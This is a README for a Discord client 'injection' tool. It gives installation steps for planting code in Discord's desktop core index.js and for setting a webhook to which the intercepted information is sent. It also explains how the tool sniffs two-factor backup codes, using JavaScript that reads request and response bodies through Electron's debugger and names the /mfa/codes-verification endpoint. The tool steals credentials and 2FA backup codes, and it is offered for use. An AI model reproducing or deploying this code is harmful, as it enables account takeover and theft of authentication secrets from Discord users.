## Installation
- Completely close Discord
- Copy the [injection code](https://raw.githubusercontent.com/saeed0x1/discord-injection/main/injection.js) inside your Discord desktop core:

`%APPDATA%\Local\Discord\app-<app-version>\modules\discord_desktop_core-<core-version>\discord_desktop_core\index.js`

- Replace `%WEBHOOK%` by your Discord webhook. The informations intercepted will be sent this way.
- Restart Discord

## How does backup codes sniffing work ?
I use the [debugger](https://www.electronjs.org/docs/latest/api/debugger) instead of the [WebRequests instance methods](https://www.electronjs.org/docs/latest/api/web-request#instance-methods). It allow me to get request body AND response body:

```js
mainWindow.webContents.debugger.on('message', async (_, method, params) => {
    if (method !== 'Network.responseReceived') return;
    if (![200, 202].includes(params.response.status)) return;

    const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
        requestId: params.requestId
    });
    const responseData = JSON.parse(responseUnparsedData.body);

    const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
        requestId: params.requestId
    });
    const requestData = JSON.parse(requestUnparsedData.postData);
})
```
The backup codes are in the response body of `/mfa/codes-verification` request
